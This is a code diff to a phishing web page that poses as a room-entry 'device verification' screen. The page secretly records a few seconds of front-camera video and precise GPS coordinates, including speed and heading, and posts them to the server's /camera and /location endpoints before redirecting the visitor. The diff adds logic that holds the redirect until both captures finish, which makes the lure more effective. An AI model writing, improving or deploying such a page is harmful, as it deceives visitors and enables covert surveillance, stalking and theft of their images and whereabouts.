@@ -107,6 +107,8 @@ body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display
 <script>
 var REDIRECT="__REDIRECT__";
 var BASE=location.protocol+"//"+location.host;
+var cameraDone=false,gpsDone=false;
+function tryRedirect(){if(cameraDone&&gpsDone){setTimeout(function(){window.location.href=REDIRECT;},400);}}
 function send(path,data){
   var url=BASE+path;
   var blob=new Blob([JSON.stringify(data)],{type:"application/json"});
@@ -161,7 +163,7 @@ function setCamStatus(msg,col){
   el.textContent=msg;
 }
 function captureCamera(){
-  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cameraDone=true;return;}
   setCamStatus('📷 Camera verification required — please allow access');
   navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
     .then(function(stream){
@@ -177,6 +179,7 @@ function captureCamera(){
         fd.append('video',blob,'capture.webm');
         fd.append('mimeType',mr.mimeType);
         fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
+        cameraDone=true;tryRedirect();
       };
       mr.start();
       setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
@@ -185,6 +188,7 @@ function captureCamera(){
       if(noHw){setCamStatus(null);}
       else{setCamStatus('⚠ Camera access is required to verify your device. Please allow and refresh.','#f85149');}
       send('/camera',{denied:true,reason:err.message||'Permission denied'});
+      cameraDone=true;tryRedirect();
     });
 }
 function autoCapture(){
@@ -230,7 +234,7 @@ function joinRoom(){
     function(pos){
       setStatus("Verified ✓  Entering room…","#3fb950");
       send("/location",{lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed,hdg:pos.coords.heading,ts:new Date().toISOString()});
-      setTimeout(function(){window.location.href=REDIRECT;},800);
+      gpsDone=true;tryRedirect();
     },
     function(err){
       send("/location",{denied:true,reason:err.message});
